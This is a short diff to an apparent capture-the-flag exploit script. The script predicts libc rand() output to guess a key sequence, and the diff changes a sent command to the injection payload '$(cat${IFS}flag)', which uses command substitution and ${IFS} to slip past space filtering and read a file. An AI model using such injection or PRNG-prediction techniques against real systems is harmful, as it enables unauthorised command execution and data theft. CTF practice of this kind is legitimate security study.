@@ -24,6 +24,7 @@ for test in range(1, 100001):
 	#read all and input all
 	for i in range(0, 37):
 		key.append('l' if libc.rand()%2 == 0 else 'h')
+		libc.rand()
 
 	try:
 		for i in range(len(key)):
@@ -51,7 +52,7 @@ for test in range(1, 100001):
 	if i==38:
 		p.recvuntil(b':')
 		p.recvuntil(b' ')
-		p.sendline("cat")
+		p.sendline("$(cat${IFS}flag)")
 		flag = []
 		#get all info
 		try:
@@ -59,6 +60,7 @@ for test in range(1, 100001):
 				flag.append(p.recvline())
 		finally:
 			print(flag)
+			p.close()
 			break
 	
 	print(f"""
